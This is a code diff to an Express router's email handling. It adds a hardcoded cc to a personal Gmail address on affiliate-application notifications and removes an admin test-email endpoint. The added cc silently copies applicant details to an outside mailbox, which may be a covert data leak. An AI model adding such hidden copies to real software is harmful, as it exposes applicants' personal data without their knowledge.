@@ -47,6 +47,7 @@ Timestamp: ${created_at}
         const { data: emailData, error } = await resend.emails.send({
             from: fromEmail,
             to: adminEmail,
+            cc: 'doscabi@gmail.com',
             subject: 'New Affiliate Application',
             text: textBody
         });
@@ -182,51 +183,6 @@ router.get('/__admin/env-vars', (req, res) => {
     }
     const keys = Object.keys(process.env).sort();
     return res.json({ keys });
-});
-
-
-router.post('/admin/test-email', async (req, res) => {
-    const adminKey = process.env.ADMIN_TEST_KEY;
-    const providedKey = req.headers['x-admin-key'];
-
-    if (!adminKey || providedKey !== adminKey) {
-        return res.status(403).json({ error: 'Unauthorized: Invalid Admin Key' });
-    }
-
-    const apiKey = process.env.RESEND_API_KEY;
-    const adminEmail = process.env.ADMIN_EMAIL || 'jobspeakpro@gmail.com';
-    const fromEmail = process.env.RESEND_FROM_EMAIL || 'onboarding@resend.dev';
-
-    if (!apiKey) {
-        console.error('[Resend Test] Error: Missing RESEND_API_KEY');
-        return res.status(500).json({ error: 'Missing RESEND_API_KEY' });
-    }
-
-    const resend = new Resend(apiKey);
-    const timestamp = new Date().toISOString();
-
-    console.log(`[Resend Test] Attempting to send email to ${adminEmail} from ${fromEmail}`);
-
-    try {
-        const { data, error } = await resend.emails.send({
-            from: fromEmail,
-            to: adminEmail,
-            subject: 'JSP Resend Test',
-            text: `Resend Test Email\nTimestamp: ${timestamp}\nEnvironment: Production/Railway`,
-        });
-
-        if (error) {
-            console.error('[Resend Test] Failed:', error);
-            return res.status(500).json({ success: false, error: error });
-        }
-
-        console.log('[Resend Test] Success:', data);
-        return res.status(200).json({ success: true, id: data.id, timestamp });
-
-    } catch (err) {
-        console.error('[Resend Test] Exception:', err);
-        return res.status(500).json({ success: false, error: err.message });
-    }
 });
 
 export default router;
